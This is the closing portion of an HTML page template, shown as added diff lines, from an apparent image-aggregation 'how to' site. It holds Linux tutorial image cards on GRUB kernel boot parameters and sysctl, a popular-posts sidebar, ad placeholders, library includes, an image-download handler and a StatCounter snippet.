+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>How To Add Kernel Boot Parameters Via Grub On Linux </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://linuxconfig.org/wp-content/uploads/2022/03/01-how-to-set-kernel-boot-parameters-on-linux.png" data-lightbox="roadtrip" title="How To Set Kernel Boot Parameters On Linux - Tutorials Learn  Configuration">
+											<img class="card-img v-image" src="https://linuxconfig.org/wp-content/uploads/2022/03/01-how-to-set-kernel-boot-parameters-on-linux.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxx2BItAuJ5BjKDIXGzE9_CUW7gPx43JhaKTCJacO7-wKTXMwEHCgzKHhcy_L9NXK_dqU';" alt="How To Set Kernel Boot Parameters On Linux - Linux Tutorials - Learn Linux  Configuration">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h5>How To Set Kernel Boot Parameters On Linux - Tutorials Learn  Configuration</h5></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://linuxize.com/post/sysctl-command-in-linux/featured.jpg" data-lightbox="roadtrip" title="Sysctl Command In Linux | Linuxize ">
+											<img class="card-img v-image" src="https://linuxize.com/post/sysctl-command-in-linux/featured.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjwUXQ4ghNWtvXzM-7zj_rXQIkB9GhchHPLE2i0q_PPR_EevOU2y8QSUlys5YmP7zj7ds';" alt="Sysctl Command In Linux | Linuxize">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>Sysctl Command In Linux | Linuxize </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+		</div>
+							</div>
+				</div> 
+				<div class="col-md-3">
+        <div class="col-sm-12 widget">
+        <h3 class="widget-title">Partnership</h3>
+					</div>
+					<div class="col-sm-12 widget">
+						<h3 class="widget-title">Popular Posts</h3>
+						<ul class="list-group">
+													<li class="list-group-item"><a href="/how-to-apply-for-unemployment-benefits-in-texas.html">How To Apply For Unemployment Benefits In Texas</a></li>
+													<li class="list-group-item"><a href="/how-to-become-a-court-reporter-in-illinois.html">How To Become A Court Reporter In Illinois</a></li>
+													<li class="list-group-item"><a href="/how-to-become-a-health-care-manager.html">How To Become A Health Care Manager</a></li>
+													<li class="list-group-item"><a href="/how-to-be-a-substitute-teacher-in-va.html">How To Be A Substitute Teacher In Va</a></li>
+													<li class="list-group-item"><a href="/how-to-become-ntsb-investigator.html">How To Become Ntsb Investigator</a></li>
+													<li class="list-group-item"><a href="/how-to-apply-for-polish-citizenship.html">How To Apply For Polish Citizenship</a></li>
+													<li class="list-group-item"><a href="/how-to-build-a-curved-bar.html">How To Build A Curved Bar</a></li>
+													<li class="list-group-item"><a href="/how-to-become-a-government-official.html">How To Become A Government Official</a></li>
+													<li class="list-group-item"><a href="/how-to-check-hops.html">How To Check Hops</a></li>
+													<li class="list-group-item"><a href="/how-to-become-a-maine-game-warden.html">How To Become A Maine Game Warden</a></li>
+													<li class="list-group-item"><a href="/how-to-build-house-yourself.html">How To Build House Yourself</a></li>
+													<li class="list-group-item"><a href="/how-to-be-a-music-manager.html">How To Be A Music Manager</a></li>
+													<li class="list-group-item"><a href="/how-to-apply-for-gun-licence.html">How To Apply For Gun Licence</a></li>
+													<li class="list-group-item"><a href="/how-to-control-a-paraglider.html">How To Control A Paraglider</a></li>
+													<li class="list-group-item"><a href="/how-to-clean-mattress-urine.html">How To Clean Mattress Urine</a></li>
+													<li class="list-group-item"><a href="/how-to-apply-for-medicaid-in-san-antonio.html">How To Apply For Medicaid In San Antonio</a></li>
+													<li class="list-group-item"><a href="/how-to-check-blackberry-email-online.html">How To Check Blackberry Email Online</a></li>
+													<li class="list-group-item"><a href="/how-to-check-session-timeout-in-jsp.html">How To Check Session Timeout In Jsp</a></li>
+													<li class="list-group-item"><a href="/how-to-become-veteran.html">How To Become Veteran</a></li>
+													<li class="list-group-item"><a href="/how-to-check-out-your-broker.html">How To Check Out Your Broker</a></li>
+						 
+						</ul>
+					</div>
+					<div class="col-sm-12 widget">
+					</br><!--ads/responsive.txt-->
+						<div class="d-block p-4">
+	<center>
+		<!-- SIDEBAR ADS -->
+	</center>
+</div>					</div>
+				</div> 
+				<div class="col-md-12 my-2" align="center">
+					<div class="d-block p-4">
+	<center>
+		<!-- BOTTOM BANNER ADS -->
+	</center>
+</div>				</div>
+			</div>
+			<div class="row footer">
+				<div class="col-md-12 text-center">
+					
+				</div>
+			</div>
+		</div>		
+	</main>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js" integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0=" crossorigin="anonymous"></script>	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js" integrity="sha256-CtKylYan+AJuoH8jrMht1+1PMhMqrKnB8K5g012WN5I=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/downloadjs/1.4.8/download.min.js"></script>
+	<!-- Footer CSS JS -->	
+	
+	
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/downloadjs/1.4.8/download.min.js"></script>
+	<script type='text/javascript'>
+		$(document).ready(function()
+	    {
+			$(document).on('click','#image-download',function(e)
+			{
+				e.preventDefault();
+				var url = $(this).data('url');
+				var title = $(this).data('title');			
+				var x=new XMLHttpRequest();
+				x.open( "GET", url , true);
+				x.responseType="blob";
+				x.onload= function(e){download(e.target.response, title, "image/jpg");};
+				x.send();
+			});
+	    });
+	</script>
+	<script type="text/javascript">
+var sc_project=12011803; 
+var sc_invisible=1; 
+var sc_security="ca0ad229"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="real time web
+analytics" href="https://statcounter.com/"
+target="_blank"><img class="statcounter"
+src="https://c.statcounter.com/12011803/0/ca0ad229/1/"
+alt="real time web analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+</body>
+</html>
